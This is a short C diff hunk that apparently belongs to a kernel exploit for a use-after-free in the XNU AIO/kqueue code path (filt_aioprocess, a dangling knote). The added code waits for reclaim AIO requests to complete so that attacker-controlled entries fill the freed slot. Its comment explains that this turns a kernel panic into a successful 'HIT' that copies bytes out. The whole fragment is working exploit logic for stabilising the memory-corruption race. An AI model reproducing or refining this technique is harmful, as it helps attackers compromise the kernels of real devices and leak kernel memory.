@@ -323,6 +323,24 @@ static int attempt_once(int attempt, nk_aio_stat_t *st)
         close(kq); close(fd); unlink(path); return 0;
     }
 
+    /* The reclaim requests being ISSUED is not the same as the allocation
+     * having HAPPENED. If the dangling knote is processed while the slot is
+     * still zeroed, filt_aioprocess reads procp == 0 and the kernel panics
+     * (FAR=0x58). Waiting for the reclaim I/O to actually complete means
+     * the slot is occupied by our entry, so the filter copies our bytes
+     * out instead of panicking. This is the difference between a panic and
+     * a HIT. */
+    int rc_done = 0;
+    for (int w = 0; w < 400000; w++) {
+        rc_done = 1;
+        for (int i = 0; i < AIO_NRECLAIM; i++) {
+            int e = aio_error(&s_rcb[i]);
+            if (e == EINPROGRESS) { rc_done = 0; break; }
+        }
+        if (rc_done) break;
+    }
+    aio_logx("B1", "att=%d reclaim_complete=%d reclaims=%d", attempt, rc_done, s_racer_issued);
+
     struct kevent64_s kev;
     memset(&kev, 0, sizeof(kev));
     struct timespec ts = { 0, 50000000 };  /* 50 ms */
